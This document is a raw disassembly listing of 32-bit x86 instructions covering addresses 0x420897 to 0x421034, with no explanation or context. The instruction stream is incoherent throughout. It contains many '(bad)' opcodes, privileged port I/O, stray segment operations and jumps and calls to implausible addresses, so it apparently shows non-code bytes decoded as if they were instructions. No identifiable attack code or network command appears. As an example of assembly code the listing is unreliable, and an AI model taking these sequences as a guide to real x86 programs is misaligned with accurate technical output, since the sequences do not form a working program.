  420897:	dec    edi
  420898:	fld    DWORD PTR [edi+0x35]
  42089b:	dec    ebx
  42089c:	inc    edi
  42089d:	push   edx
  42089e:	inc    ebp
  42089f:	inc    ebp
  4208a0:	dec    ebx
  4208a1:	fistp  DWORD PTR [ebx-0x65]
  4208a4:	xchg   edx,eax
  4208a5:	call   DWORD PTR [ebp+edx*2+0x52]
  4208a9:	dec    ebx
  4208aa:	dec    ecx
  4208ab:	push   ebx
  4208ac:	dec    eax
  4208ad:	dec    eax
  4208ae:	inc    esi
  4208af:	xor    DWORD PTR [edi+0x76],edx
  4208b2:	imul   ebp,DWORD PTR [edi+0x61],0x63
  4208b6:	pop    ss
  4208b7:	push   cs
  4208b8:	xchg   edx,eax
  4208b9:	dec    ecx
  4208ba:	inc    ebx
  4208bb:	pop    ss
  4208bc:	cld    
  4208bd:	(bad)  
  4208be:	in     al,0x57
  4208c0:	inc    edx
  4208c1:	inc    ecx
  4208c2:	dec    esp
  4208c3:	push   esp
  4208c4:	pop    edi
  4208c5:	push   edx
  4208c6:	push   ebp
  4208c7:	push   ebx
  4208c8:	jle    0x420912
  4208ca:	pop    eax
  4208cb:	sub    edx,DWORD PTR [edi+ebx*8+0x5f]
  4208cf:	imul   edx,DWORD PTR [eax+ecx*2+0x41],0x78
  4208d4:	sti    
  4208d5:	dec    dx
  4208d7:	adc    al,BYTE PTR [ebp+0x41]
  4208da:	push   ebx
  4208db:	push   esp
  4208dc:	inc    ebp
  4208dd:	xchg   ebx,eax
  4208de:	dec    edi
  4208df:	push   eax
  4208e0:	inc    ebp
  4208e1:	or     eax,0x574af927
  4208e6:	dec    edi
  4208e7:	inc    ebp
  4208e8:	dec    ebp
  4208e9:	push   0x11
  4208eb:	rol    DWORD PTR [ebp-0x80],cl
  4208ee:	jae    0x4208c9
  4208f0:	xchg   edx,eax
  4208f1:	pusha  
  4208f2:	cmove  ebx,DWORD PTR [edx-0x4a]
  4208f6:	out    0xb,eax
  4208f8:	jecxz  0x4208ae
  4208fa:	mov    ah,0x2
  4208fc:	mov    eax,0xf268b9bc
  420901:	xor    BYTE PTR [ebx+eiz*1],al
  420904:	dec    ebp
  420905:	xchg   esi,eax
  420906:	les    edi,FWORD PTR [ebx-0x6afeff16]
  42090c:	jne    0x6c5b0a45
  420912:	pop    ss
  420913:	arpl   WORD PTR [eax+ecx*8+0x43],bp
  420917:	sbb    esp,DWORD PTR [edx+ebp*1+0x25]
  42091b:	test   al,0x59
  42091d:	dec    ebp
  42091e:	ss and al,0xef
  420921:	sub    dh,BYTE PTR [ebx-0x2f2977cb]
  420927:	cmp    dl,BYTE PTR [esi+0x4]
  42092a:	les    ebp,FWORD PTR [esi-0x37308802]
  420930:	int3   
  420931:	pop    ss
  420932:	test   BYTE PTR [eax+0x19],0x1
  420936:	je     0x420941
  420938:	mov    DWORD PTR [ebp-0x30],0x380060bc
  42093f:	jae    0x42091e
  420941:	jmp    0x42094a
  420943:	or     BYTE PTR [eax-0x6cfde7ab],dl
  420949:	xchg   ecx,eax
  42094a:	mov    bl,0x97
  42094c:	pop    ebp
  42094d:	mov    BYTE PTR [ebp-0x2c],al
  420950:	or     al,0x4
  420952:	aad    0x6
  420954:	mov    ah,0x9b
  420956:	xchg   ecx,eax
  420957:	or     dh,dl
  420959:	mov    al,BYTE PTR [eax+0x1a]
  42095c:	or     BYTE PTR [edi-0x4923ab75],dh
  420962:	stos   DWORD PTR es:[edi],eax
  420963:	push   ebp
  420964:	jo     0x420928
  420966:	sbb    esi,edi
  420968:	or     eax,0x6e82a906
  42096d:	mov    edx,0x1a0b6489
  420972:	fwait
  420973:	jne    0x42098d
  420975:	or     dl,BYTE PTR ds:0xda1d9fbe
  42097b:	fldenv [eax+0x63aa452a]
  420981:	fs inc ebx
  420983:	mov    edx,0xb4385b25
  420988:	sbb    dh,BYTE PTR [esi+edi*2-0x390932ae]
  42098f:	inc    ebp
  420990:	fiadd  DWORD PTR [eax]
  420992:	add    ebx,eax
  420994:	fldcw  WORD PTR [ebx+eiz*1]
  420997:	push   0xad6fc8fe
  42099c:	sahf   
  42099d:	sub    BYTE PTR [ebp-0x24eb0ff8],ch
  4209a3:	add    ch,bl
  4209a5:	xchg   ecx,eax
  4209a6:	fcomp  DWORD PTR [edx+0x1050abb]
  4209ac:	jmp    0x4209b2
  4209ae:	add    BYTE PTR [eax+eax*8],dh
  4209b1:	mov    ecx,esp
  4209b3:	add    BYTE PTR ds:0x894ba8bb,0x42
  4209ba:	xchg   ebp,eax
  4209bb:	and    ebp,DWORD PTR [eax+eiz*1]
  4209be:	div    BYTE PTR [eax]
  4209c0:	mov    WORD PTR [esi],fs
  4209c2:	jo     0x420a17
  4209c4:	or     eax,0x83292458
  4209c9:	jo     0x4209de
  4209cb:	push   esp
  4209cc:	xchg   BYTE PTR [ecx],bl
  4209ce:	leave  
  4209cf:	pusha  
  4209d0:	inc    esi
  4209d1:	add    BYTE PTR [eax],cl
  4209d3:	fwait
  4209d4:	ins    BYTE PTR es:[edi],dx
  4209d5:	lods   eax,DWORD PTR ds:[esi]
  4209d6:	sbb    al,BYTE PTR [edx]
  4209d8:	test   eax,0x2f18f5e8
  4209dd:	rcr    DWORD PTR [ebp+0xdec8b05],0x93
  4209e4:	jne    0x420a5e
  4209e6:	adc    esi,DWORD PTR [edx+0x20]
  4209e9:	jg     0xf6b804bb
  4209ef:	or     eax,DWORD PTR [ebp-0x47]
  4209f2:	cmp    BYTE PTR [eax],cl
  4209f4:	retf   0xf1c
  4209f7:	mov    bh,0x4
  4209f9:	inc    ebp
  4209fa:	sbb    eax,0xa001de89
  4209ff:	outs   dx,BYTE PTR ds:[esi]
  420a00:	(bad)  
  420a01:	out    dx,al
  420a02:	imul   edx,eax,0xffffffee
  420a05:	xor    BYTE PTR [esi+0x7cbc1f3c],ah
  420a0b:	aam    0x3c
  420a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a0e:	fs fs in al,dx
  420a11:	mov    eax,0x73cc0124
  420a16:	(bad)  
  420a17:	loopne 0x4209ad
  420a19:	inc    eax
  420a1a:	or     BYTE PTR [edi-0x6f],bl
  420a1d:	inc    esi
  420a1e:	mov    al,ds:0x9f983212
  420a23:	lock or BYTE PTR [esi],ah
  420a26:	pop    edi
  420a27:	and    al,0x7d
  420a29:	mov    ds:0x86c6ccd0,eax
  420a2e:	jl     0x420a57
  420a30:	and    al,0xe1
  420a32:	mov    ds:0x43a8917b,eax
  420a37:	mov    ebx,0xc71eb904
  420a3c:	xchg   ebp,eax
  420a3d:	pop    ss
  420a3e:	push   ecx
  420a3f:	dec    edi
  420a40:	int    0x46
  420a42:	mov    bl,0x6c
  420a44:	pop    ss
  420a45:	push   ebx
  420a46:	mov    fs:0x78474e31,eax
  420a4c:	ss add al,0x1c
  420a4f:	stos   DWORD PTR es:[edi],eax
  420a50:	clc    
  420a51:	outs   dx,BYTE PTR ds:[esi]
  420a52:	xor    al,0x7a
  420a54:	sub    dl,0x1
  420a57:	push   es
  420a58:	dec    edx
  420a59:	jmp    0x420a6b
  420a5b:	adc    eax,0x4cd74cf0
  420a60:	push   edi
  420a61:	fidivr DWORD PTR [edx]
  420a63:	add    DWORD PTR [edi],ecx
  420a65:	or     BYTE PTR [edx],al
  420a67:	mov    ecx,0xee09b66c
  420a6c:	call   0xf5283a73
  420a71:	jns    0x420a21
  420a73:	fs lock mov al,fs:0x47b8d0e8
  420a7b:	push   ebp
  420a7c:	or     BYTE PTR [edi-0x5417b888],cl
  420a82:	push   edi
  420a83:	adc    ebx,DWORD PTR [edx+0x43ff97b0]
  420a89:	mov    eax,ds:0x50b34382
  420a8e:	or     al,0x98
  420a90:	adc    al,0x9
  420a92:	or     DWORD PTR [eax-0x54fc52b0],ebx
  420a98:	arpl   WORD PTR [edx+ebp*4-0x76],bx
  420a9c:	mul    BYTE PTR ds:0xc426554c
  420aa2:	mul    BYTE PTR [esi]
  420aa4:	and    cl,BYTE PTR [eax+0x74]
  420aa7:	push   edi
  420aa8:	push   esi
  420aa9:	lods   al,BYTE PTR ds:[esi]
  420aaa:	je     0x420ae2
  420aac:	sub    esp,DWORD PTR [eax]
  420aae:	inc    edi
  420aaf:	(bad)  
  420ab0:	jecxz  0x420b09
  420ab2:	push   cs
  420ab3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ab5:	adc    bh,BYTE PTR [ebp+0x507b9c25]
  420abb:	add    BYTE PTR [ebx],dl
  420abd:	or     BYTE PTR [esi],dl
  420abf:	dec    ebx
  420ac0:	xchg   esp,eax
  420ac1:	pop    edx
  420ac2:	sahf   
  420ac3:	add    al,0x82
  420ac5:	and    ecx,DWORD PTR [esi]
  420ac7:	and    al,0xf8
  420ac9:	cmp    eax,DWORD PTR [ecx]
  420acb:	and    eax,0x211561a3
  420ad0:	imul   esi,DWORD PTR [eax+0x730190d7],0xb81c98b3
  420ada:	dec    ebx
  420adb:	inc    ecx
  420adc:	or     edx,DWORD PTR es:[esi]
  420adf:	scas   eax,DWORD PTR es:[edi]
  420ae0:	lods   al,BYTE PTR ds:[esi]
  420ae1:	hlt    
  420ae2:	adc    al,0xf0
  420ae4:	fsub   QWORD PTR [ecx+ebp*4-0x30]
  420ae8:	test   al,0xa7
  420aea:	jne    0x420b0c
  420aec:	into   
  420aed:	or     eax,0xf28bf812
  420af2:	push   ds
  420af3:	lods   al,BYTE PTR ds:[esi]
  420af4:	js     0x420b69
  420af6:	inc    ecx
  420af7:	push   eax
  420af8:	das    
  420af9:	and    BYTE PTR [ecx+0x5a],bl
  420afc:	mov    edi,0xbc44b556
  420b01:	jae    0x420b07
  420b03:	fimul  DWORD PTR [eax+0x7]
  420b06:	or     bl,BYTE PTR [esi]
  420b08:	(bad)  
  420b09:	jmp    DWORD PTR [esi]
  420b0b:	jo     0x420b04
  420b0d:	shl    BYTE PTR [edx],1
  420b0f:	inc    ebx
  420b10:	or     BYTE PTR [edx-0x2fc5f7ad],cl
  420b16:	je     0x420b4f
  420b18:	pop    ebp
  420b19:	mov    BYTE PTR [edx-0x39f87389],dh
  420b1f:	dec    esp
  420b20:	adc    cl,BYTE PTR [eax+edx*2+0x5da10e5d]
  420b27:	mov    dh,0x64
  420b29:	nop
  420b2a:	cmp    cl,BYTE PTR [eax-0x1fddddfe]
  420b30:	push   esp
  420b31:	(bad)  
  420b32:	shr    BYTE PTR [ebp-0x284da55e],1
  420b38:	daa    
  420b39:	jo     0x420ae6
  420b3b:	xor    BYTE PTR [ebx+0x262f3f8e],0xa7
  420b42:	adc    al,0x9e
  420b44:	inc    eax
  420b45:	add    edx,DWORD PTR [ecx-0x23]
  420b48:	xchg   eax,edx
  420b4a:	inc    eax
  420b4b:	inc    ebx
  420b4c:	outs   dx,DWORD PTR ds:[esi]
  420b4d:	and    BYTE PTR [ebx],0x41
  420b50:	cmp    al,BYTE PTR [ebx+0x1c]
  420b53:	mov    eax,DWORD PTR [eax+eax*4]
  420b56:	arpl   WORD PTR [eax],cx
  420b58:	jo     0x420b50
  420b5a:	idiv   BYTE PTR [ebx-0x7fee7102]
  420b60:	dec    ebx
  420b61:	or     BYTE PTR [ecx],al
  420b63:	mov    DWORD PTR [ecx+0x2a18538d],ebx
  420b69:	hlt    
  420b6a:	inc    DWORD PTR [ebx]
  420b6c:	es adc al,0x8b
  420b6f:	lods   eax,DWORD PTR ds:[esi]
  420b70:	lock mov bl,BYTE PTR [esi+0x8]
  420b74:	not    ebx
  420b76:	inc    ebx
  420b77:	add    al,0xfc
  420b79:	out    dx,al
  420b7a:	and    bl,BYTE PTR [esp]
  420b7d:	jns    0x420ba6
  420b7f:	cmp    BYTE PTR [edx],bh
  420b81:	ret    
  420b82:	je     0x420bd7
  420b84:	push   eax
  420b85:	inc    ebp
  420b86:	lds    ecx,FWORD PTR [ecx+0x50]
  420b89:	and    al,0xa1
  420b8b:	adc    DWORD PTR [edx-0x3d57ee31],0x7f
  420b92:	inc    edi
  420b93:	adc    dh,ah
  420b95:	and    BYTE PTR [ecx+0x285b1558],bh
  420b9b:	add    bh,BYTE PTR [esi+0x1cb21e38]
  420ba1:	mov    dl,0xb
  420ba3:	add    al,0x64
  420ba5:	or     BYTE PTR [edx+ecx*1-0x24a08412],dl
  420bac:	pop    ebp
  420bad:	mov    BYTE PTR [edx],al
  420baf:	outs   dx,DWORD PTR ds:[esi]
  420bb0:	add    bh,al
  420bb2:	ror    DWORD PTR [eax+ebx*1],0x22
  420bb6:	sbb    ebp,DWORD PTR [esi-0x27]
  420bb9:	and    eax,eax
  420bbb:	repnz adc DWORD PTR [eax+ebx*1-0x36460c9c],esp
  420bc3:	adc    al,0x28
  420bc5:	lahf   
  420bc6:	sub    edx,DWORD PTR [eax]
  420bc8:	and    esi,DWORD PTR [eax+0x64]
  420bcb:	dec    edi
  420bcc:	call   0x46:0x18d2100e
  420bd3:	das    
  420bd4:	mul    BYTE PTR ss:[ebx]
  420bd7:	enter  0xeb20,0x24
  420bdb:	adc    BYTE PTR [edx],dl
  420bdd:	xor    BYTE PTR ds:0x4b2d9808,cl
  420be3:	cmp    eax,0xb06c2f11
  420be8:	push   cs
  420be9:	shl    BYTE PTR [ebx+ecx*1],1
  420bec:	or     BYTE PTR [edi+0x10],dh
  420bef:	push   0x21
  420bf1:	popa   
  420bf2:	in     eax,0xb0
  420bf4:	add    dl,BYTE PTR [edx+0x18]
  420bf7:	and    edx,DWORD PTR [eax+ecx*4+0x25580c96]
  420bfe:	add    DWORD PTR [ebx-0x44bc3421],edi
  420c04:	clc    
  420c05:	sti    
  420c06:	mov    WORD PTR [ebp+0x8030007],0xfbfa
  420c0f:	fist   DWORD PTR ds:0xa7dd13a2
  420c15:	pop    es
  420c16:	mov    ecx,0xa04fe40
  420c1b:	dec    esi
  420c1c:	and    BYTE PTR [esi-0x6b9cd85c],0x6b
  420c23:	push   eax
  420c24:	sub    DWORD PTR [ecx+ebp*1],esi
  420c27:	push   0xb
  420c29:	test   al,0x18
  420c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c2c:	push   0xefac7171
  420c31:	inc    ebp
  420c32:	aam    0xad
  420c34:	sti    
  420c35:	out    0x8c,eax
  420c37:	mov    dh,BYTE PTR [edi+0x661fd3d]
  420c3d:	mov    dl,BYTE PTR [eax-0x62]
  420c40:	push   ds
  420c41:	call   0xfc5ac9c7
  420c46:	jmp    0xc0:0x13b685b5
  420c4d:	call   0x9764:0x850b1f4c
  420c54:	sbb    dh,BYTE PTR [edi+0x5008f2c3]
  420c5a:	and    esp,DWORD PTR [ecx]
  420c5c:	push   esi
  420c5d:	push   eax
  420c5e:	in     al,dx
  420c5f:	arpl   WORD PTR [esi-0x73],di
  420c62:	test   BYTE PTR [ebp-0x4a48c020],al
  420c68:	leave  
  420c69:	xchg   esi,eax
  420c6a:	in     al,dx
  420c6b:	pop    es
  420c6c:	push   ebx
  420c6d:	sbb    eax,0xdb171c35
  420c72:	in     al,dx
  420c73:	mov    dl,0x93
  420c75:	adc    ebp,ebx
  420c77:	push   ds
  420c78:	xor    ebx,esp
  420c7a:	jae    0x420caf
  420c7c:	or     BYTE PTR [ebx+0x7],bh
  420c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c80:	and    eax,0x15182973
  420c85:	enter  0xc1b1,0x2a
  420c89:	cmp    BYTE PTR [eax+0x70f88d8e],al
  420c8f:	and    BYTE PTR ds:0x4fb02b63,dl
  420c95:	hlt    
  420c96:	or     eax,0xaf5b9db2
  420c9b:	inc    esi
  420c9c:	sub    ah,dh
  420c9e:	clc    
  420c9f:	retf   0xb600
  420ca2:	xchg   edx,eax
  420ca3:	adc    BYTE PTR [eax+0x3aaf4864],dl
  420ca9:	jo     0x420cb6
  420cab:	pop    edi
  420cac:	jl     0x420d07
  420cae:	cmp    eax,DWORD PTR ds:0x5eb854e
  420cb4:	mov    dh,0xaf
  420cb6:	adc    eax,0xb856d832
  420cbb:	ds out dx,eax
  420cbd:	xor    esi,DWORD PTR [esi]
  420cbf:	mov    ds:0x1bf60760,al
  420cc4:	sbb    DWORD PTR [ecx],ebp
  420cc6:	aam    0x93
  420cc8:	test   eax,0x20e0082e
  420ccd:	les    ebp,FWORD PTR [eax+0xc4dff94]
  420cd3:	cmp    esi,DWORD PTR [eax+0x75ff793b]
  420cd9:	stos   BYTE PTR es:[edi],al
  420cda:	and    eax,0x21018cd1
  420cdf:	dec    edx
  420ce0:	push   ss
  420ce1:	clc    
  420ce2:	fwait
  420ce3:	outs   dx,BYTE PTR ds:[esi]
  420ce4:	inc    esi
  420ce5:	sbb    eax,0x6004bf02
  420cea:	or     al,0x24
  420cec:	aas    
  420ced:	mov    BYTE PTR [ecx+0x70],bl
  420cf0:	in     eax,0x2a
  420cf2:	ins    BYTE PTR es:[edi],dx
  420cf3:	sbb    BYTE PTR [ecx+0x5c40e2ae],dh
  420cf9:	addr16 push eax
  420cfb:	or     bl,BYTE PTR [esi+0x60]
  420cfe:	fwait
  420cff:	mov    ch,BYTE PTR [edi+0xb]
  420d02:	pusha  
  420d03:	mov    dh,0x6a
  420d05:	call   FWORD PTR [eax]
  420d07:	xor    al,0x6b
  420d09:	and    esi,DWORD PTR [ecx+0x8]
  420d0c:	push   es
  420d0d:	add    al,0x43
  420d0f:	dec    ebp
  420d10:	fwait
  420d11:	add    al,0xf7
  420d13:	mov    al,0xdf
  420d15:	push   ebx
  420d16:	and    al,0xc0
  420d18:	in     al,dx
  420d19:	sbb    esp,ebx
  420d1b:	mov    ds:0x1def502,eax
  420d20:	sub    dh,BYTE PTR [ebx+0x27]
  420d23:	leave  
  420d24:	stos   DWORD PTR es:[edi],eax
  420d25:	dec    ebx
  420d26:	inc    eax
  420d27:	xor    BYTE PTR [edx],dl
  420d29:	cmp    BYTE PTR [edi+0x5d60e5a],dh
  420d2f:	arpl   WORD PTR [eax-0x28],ax
  420d32:	jae    0x420cb8
  420d34:	push   ss
  420d35:	cmp    BYTE PTR [eax-0x1fef9d13],0x4a
  420d3c:	mov    cl,0x3a
  420d3e:	sub    BYTE PTR [eax],dl
  420d40:	mul    BYTE PTR [ecx+0x14]
  420d43:	lock sbb edi,DWORD PTR [edi+ebx*2-0x38]
  420d48:	mov    bl,0x1
  420d4a:	cmp    eax,0x18ababe4
  420d4f:	jnp    0x420d78
  420d51:	(bad)  
  420d52:	nop
  420d53:	neg    BYTE PTR [ebx+0x54af17df]
  420d59:	or     cl,BYTE PTR [ebx-0x10]
  420d5c:	add    al,0x8a
  420d5e:	pop    esp
  420d5f:	and    al,0x34
  420d61:	push   esi
  420d62:	push   ebx
  420d63:	sahf   
  420d64:	add    esp,ebp
  420d66:	or     BYTE PTR [ebx-0x3c],dl
  420d69:	cmp    BYTE PTR [ebx],dl
  420d6b:	push   0x48
  420d6d:	fucomp st(7)
  420d6f:	out    0xf8,eax
  420d71:	xor    al,0x84
  420d73:	adc    eax,0x7df7582a
  420d78:	inc    ebx
  420d79:	cwde   
  420d7a:	adc    ecx,DWORD PTR [eax-0x2c]
  420d7d:	out    dx,al
  420d7e:	add    DWORD PTR [edx+0x7637cd54],0x2a
  420d85:	lods   al,BYTE PTR ds:[esi]
  420d86:	test   ebp,0x2c1f77db
  420d8c:	xor    BYTE PTR [ebp+0x2a],0xbe
  420d90:	pop    ss
  420d91:	sub    edx,DWORD PTR [edi+edi*4-0x78]
  420d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d96:	add    BYTE PTR [edi+ecx*1+0x64],dh
  420d9a:	xor    bh,BYTE PTR [ebx]
  420d9c:	or     DWORD PTR [eax-0x861fae3],ecx
  420da2:	idiv   bh
  420da4:	sbb    BYTE PTR [edi],al
  420da6:	jb     0x20b49018
  420dac:	sub    BYTE PTR [edi-0x7d],0x53
  420db0:	sub    DWORD PTR [ebp+0x3d4e8362],0x20
  420db7:	dec    edi
  420db8:	fs inc ecx
  420dba:	mov    al,0xbb
  420dbc:	sub    esi,DWORD PTR [eax-0x4aaff5e0]
  420dc2:	pop    es
  420dc3:	sub    edi,eax
  420dc5:	fcomp  QWORD PTR [edx-0x68]
  420dc8:	add    eax,0xbac88a86
  420dcd:	adc    al,0x16
  420dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dd0:	sub    al,0xb7
  420dd2:	mov    bl,0x5
  420dd4:	push   ss
  420dd5:	sbb    al,0x6b
  420dd7:	fld    TBYTE PTR [eax+edi*1]
  420dda:	mov    edx,0xb8161088
  420ddf:	sub    edi,DWORD PTR [ebx-0x4fb8bee4]
  420de5:	(bad)  
  420de6:	data16 jmp 0x420e49
  420de9:	addr16 jl 0x420e4f
  420dec:	cmp    ah,ch
  420dee:	out    0xfc,eax
  420df0:	dec    edi
  420df1:	and    bl,ah
  420df3:	sub    al,0x20
  420df5:	and    esi,DWORD PTR [ecx-0x6e]
  420df8:	mov    DWORD PTR [ebx-0x79fb5700],ecx
  420dfe:	inc    esp
  420dff:	add    eax,0x2d902c3b
  420e04:	gs xor al,0xab
  420e07:	ds clc 
  420e09:	daa    
  420e0a:	jo     0x420e82
  420e0c:	pop    es
  420e0d:	sub    eax,DWORD PTR [edx]
  420e0f:	add    DWORD PTR [ebx],esi
  420e11:	sahf   
  420e12:	inc    ecx
  420e13:	sbb    eax,edx
  420e15:	jne    0x420e62
  420e17:	xor    esp,DWORD PTR [edx+0x19]
  420e1a:	rcl    BYTE PTR [esi+0x6c837fdf],1
  420e20:	jno    0x420deb
  420e22:	sub    eax,0x9eab8085
  420e27:	fsub   DWORD PTR [edx]
  420e29:	xchg   ebx,eax
  420e2a:	in     al,dx
  420e2b:	bound  eax,QWORD PTR [ecx+0x9]
  420e2e:	inc    esi
  420e2f:	and    al,0x20
  420e31:	psubw  mm3,QWORD PTR fs:[esi+0x2818286f]
  420e39:	pop    eax
  420e3a:	aam    0x9
  420e3c:	xchg   ebx,eax
  420e3d:	dec    esp
  420e3e:	xor    cl,cl
  420e40:	enter  0xd0cc,0x7c
  420e44:	das    
  420e45:	ret    0x6313
  420e48:	dec    eax
  420e4a:	jae    0x420de4
  420e4c:	das    
  420e4d:	or     esp,esp
  420e4f:	pop    ebx
  420e50:	add    eax,0x45a4b091
  420e55:	pusha  
  420e56:	mov    ecx,0x1f616212
  420e5b:	bnd jmp 0x420e12
  420e5e:	sar    BYTE PTR [ecx+0x47511434],0xf2
  420e65:	xchg   edx,eax
  420e66:	and    ebp,DWORD PTR ds:0x7b0f808c
  420e6c:	mov    BYTE PTR [edx],0x57
  420e6f:	in     eax,dx
  420e70:	sti    
  420e71:	sub    dh,BYTE PTR [eax+ebp*2+0x4b]
  420e75:	dec    eax
  420e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e77:	scas   eax,DWORD PTR es:[edi]
  420e78:	cmc    
  420e79:	es or  eax,ebp
  420e7c:	push   es
  420e7d:	loopne 0x420e95
  420e7f:	mov    dh,0x49
  420e81:	sahf   
  420e82:	in     al,dx
  420e83:	mov    BYTE PTR [edx+0x5],ch
  420e86:	or     ecx,DWORD PTR [edx+ebp*2+0x7f2d900d]
  420e8d:	cli    
  420e8e:	neg    DWORD PTR [ebp+0x68fa41d1]
  420e94:	adc    BYTE PTR [ebp+ecx*2+0x2cb966f0],dl
  420e9b:	push   edi
  420e9c:	pushf  
  420e9d:	or     eax,0x1a1f9419
  420ea2:	test   al,0xb
  420ea4:	add    DWORD PTR [edx],esi
  420ea6:	and    eax,0x1014c8db
  420eab:	int3   
  420eac:	je     0x420e73
  420eae:	out    0xd8,al
  420eb0:	rcl    BYTE PTR [eax],1
  420eb2:	sub    esp,DWORD PTR [ebx+ebp*1-0x44]
  420eb6:	inc    esi
  420eb7:	fcom   DWORD PTR [ebx]
  420eb9:	test   esp,esp
  420ebb:	test   DWORD PTR [esi+0x28],eax
  420ebe:	rcr    ebp,cl
  420ec0:	push   edi
  420ec1:	pop    edi
  420ec2:	ja     0x420ee3
  420ec4:	sar    BYTE PTR [edx+0x744be004],1
  420eca:	mov    ch,0x18
  420ecc:	adc    esp,DWORD PTR [ecx]
  420ece:	push   ebp
  420ecf:	mov    bh,BYTE PTR [ebx+ebx*4]
  420ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ed3:	and    DWORD PTR [esp+ecx*4+0x5fffff97],esi
  420eda:	ds das 
  420edc:	and    DWORD PTR [ecx],ecx
  420ede:	dec    esp
  420edf:	xchg   esp,eax
  420ee0:	cmc    
  420ee1:	cwde   
  420ee2:	frstor [ebx-0x7da1a2a6]
  420ee8:	pop    esp
  420ee9:	cli    
  420eea:	loope  0x420ef3
  420eec:	cmp    DWORD PTR [ebx],edi
  420eee:	cmp    DWORD PTR [edi-0x50],esp
  420ef1:	jle    0x420ef2
  420ef3:	(bad)  
  420ef4:	(bad)  
  420ef5:	inc    ebp
  420ef7:	ror    DWORD PTR [ebx],0x45
  420efa:	iret   
  420efb:	dec    ebp
  420efc:	or     BYTE PTR ds:0x2f1b45cf,ch
  420f02:	sub    al,ah
  420f04:	pop    edx
  420f05:	nop
  420f06:	pop    esp
  420f07:	sti    
  420f08:	or     cl,al
  420f0a:	add    bh,0x40
  420f0d:	add    DWORD PTR [eax],0x880e733d
  420f13:	cmc    
  420f14:	jno    0x420f57
  420f16:	std    
  420f17:	dec    ebp
  420f19:	div    BYTE PTR [ebx]
  420f1b:	push   es
  420f1c:	jl     0x420eff
  420f1e:	cmovs  edx,DWORD PTR [ebx+0x19]
  420f22:	ins    BYTE PTR es:[edi],dx
  420f23:	call   FWORD PTR [edx+0x4c8e1bdb]
  420f29:	jmp    FWORD PTR [ebp-0x7c]
  420f2c:	or     al,0x3b
  420f2e:	or     edi,ebx
  420f30:	(bad)  
  420f31:	(bad)  
  420f32:	mov    edi,0x3379b03f
  420f37:	mov    dl,0x7b
  420f39:	xor    eax,0x980098c
  420f3e:	test   BYTE PTR [ecx+0x13],cl
  420f41:	add    BYTE PTR [edx-0x1f],0xdd
  420f45:	pop    esp
  420f46:	ror    DWORD PTR [ecx+0x3],0xd8
  420f4a:	dec    eax
  420f4b:	int    0x4c
  420f4d:	(bad)  
  420f4e:	(bad)  
  420f4f:	(bad)  
  420f50:	call   edx
  420f52:	dec    esi
  420f53:	cmp    cl,cl
  420f55:	jecxz  0x420f86
  420f57:	mov    fs,ebp
  420f59:	das    
  420f5a:	xchg   edx,eax
  420f5b:	in     eax,dx
  420f5c:	push   edx
  420f5d:	sub    dl,BYTE PTR ds:0x5e85ea57
  420f63:	dec    edx
  420f64:	mov    ebx,0x62b9de63
  420f69:	inc    edx
  420f6a:	mov    bh,0x67
  420f6c:	fidivr WORD PTR [ebp-0xce358d]
  420f72:	jg     0x420f15
  420f74:	dec    DWORD PTR [ebx-0x1a]
  420f77:	cdq    
  420f78:	inc    edx
  420f79:	push   cs
  420f7a:	pop    esp
  420f7b:	xchg   edi,eax
  420f7c:	shr    BYTE PTR [ebp+esi*4-0x2b],0x53
  420f81:	repnz adc dl,BYTE PTR [edx]
  420f84:	push   cs
  420f85:	push   cs
  420f86:	stc    
  420f87:	or     dl,BYTE PTR [esi+0x75]
  420f8a:	jp     0x45e0c85
  420f90:	lock xor edx,DWORD PTR [esi-0x7abd684d]
  420f97:	jns    0x420fb7
  420f99:	adc    DWORD PTR [ebx-0x12],esp
  420f9c:	cwde   
  420f9d:	(bad)  
  420f9e:	(bad)  
  420f9f:	call   FWORD PTR [ebx+0x6d]
  420fa2:	push   ebx
  420fa3:	iret   
  420fa4:	sub    bl,BYTE PTR [si+0x115c]
  420fa9:	xor    al,0x43
  420fab:	in     al,dx
  420fac:	inc    edi
  420fad:	add    bh,BYTE PTR [esp+edi*2-0x128cfbcb]
  420fb4:	inc    edi
  420fb5:	sbb    bh,BYTE PTR [ebp+0x5b0d1662]
  420fbb:	jmp    FWORD PTR [edi]
  420fbd:	cld    
  420fbe:	(bad)  
  420fbf:	jmp    0x1ddb:0x11f25b99
  420fc6:	iret   
  420fc7:	je     0x420f62
  420fc9:	add    al,0x70
  420fcb:	xchg   ecx,eax
  420fcc:	rcr    BYTE PTR [ebp+0x26627b21],1
  420fd2:	cdq    
  420fd3:	pusha  
  420fd4:	(bad)  
  420fd5:	mov    cl,0xa0
  420fd7:	test   DWORD PTR [ebx-0x1],esp
  420fda:	(bad)  
  420fdb:	(bad)  
  420fdc:	jmp    DWORD PTR [eax-0x5d]
  420fdf:	mov    al,ds:0xd3582c1d
  420fe4:	mov    esp,0x3bd0d542
  420fe9:	sar    BYTE PTR [eax-0x21],0x7f
  420fed:	inc    edx
  420fee:	xchg   esi,eax
  420fef:	in     eax,dx
  420ff0:	push   0x50ed4181
  420ff5:	mov    eax,0xb658dd79
  420ffa:	imul   ebx,ebp,0xffdbfb50
  421000:	(bad)  
  421001:	mov    ebp,0xc728ad60
  421006:	pop    ds
  421007:	lods   eax,DWORD PTR ds:[esi]
  421008:	xor    ah,bl
  42100a:	adc    al,0xbd
  42100c:	cmp    bl,dl
  42100e:	adc    DWORD PTR [ebp+0xf34da30],edi
  421014:	fild   WORD PTR [edx]
  421016:	lods   eax,DWORD PTR ds:[esi]
  421017:	push   eax
  421018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421019:	jbe    0x42103a
  42101b:	(bad)  
  42101c:	(bad)  
  42101d:	in     eax,dx
  42101e:	jb     0x420fd9
  421020:	dec    ebx
  421021:	mov    al,0x7c
  421023:	das    
  421024:	popf   
  421025:	sub    eax,0xb6cb6828
  42102a:	clc    
  42102b:	aas    
  42102c:	mov    esp,0x72b837fe
  421031:	xchg   ebx,eax
  421032:	jnp    0x420fda
  421034:	(bad)  
